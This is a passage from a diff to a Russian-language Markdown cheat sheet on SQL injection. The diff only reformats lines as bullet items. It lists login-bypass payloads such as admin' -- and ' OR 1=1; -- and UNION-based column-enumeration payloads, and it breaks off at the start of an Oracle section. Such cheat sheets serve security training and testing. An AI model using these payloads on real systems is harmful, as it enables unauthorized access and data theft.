@@ -17,16 +17,16 @@ SQL-инъекция — это уязвимость веб-безопаснос
 ## 2. Обход аутентификации (Login Bypass)
 - admin' --
 - ' OR 1=1; --
- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 Измените usernameпараметр, присвоив ему значение:administrator'--
 
 ## 3. UNION-атака (определение колонок)
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
+- ' ORDER BY 1--
+- ' ORDER BY 2--
+- ' ORDER BY 3--
+- ' UNION SELECT NULL--
+- ' UNION SELECT NULL,NULL--
+- ' UNION SELECT NULL,NULL,NULL--
 
 ### 3.1 UNION-атака (определение колонок в Oracle)
 В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
